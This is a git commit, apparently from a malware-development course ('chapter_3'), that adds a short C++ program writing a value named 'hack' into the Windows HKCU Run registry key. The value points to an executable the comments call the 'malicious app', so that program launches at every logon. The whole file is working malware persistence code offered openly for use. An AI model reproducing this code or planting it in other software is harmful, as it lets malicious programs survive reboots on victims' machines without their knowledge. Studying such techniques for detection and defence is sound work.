ab911ba484562081812d76ff879462fac0cdec6b
KereK DereK <kerekderek1@gmail.com>
2024-10-11 16:14:45 +0400

    [chapter_3 | persistence1] add working persistence that leverages autorun registry keys

---
+++ chapter_3/persistence1.cpp
@@ -0,0 +1,16 @@
+#include <windows.h>
+#include <string.h>
+
+int main(int argc, char* argv[]) {
+    HKEY hkey = NULL;
+    // malicious app
+    const char* exe = "C:\\Users\\Public\\to_persist.exe";
+    // startup
+    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,KEY_WRITE, &hkey);
+    if (result == ERROR_SUCCESS) {
+        // create new registry key
+        RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
+        RegCloseKey(hkey);
+    }
+    return 0;
+}
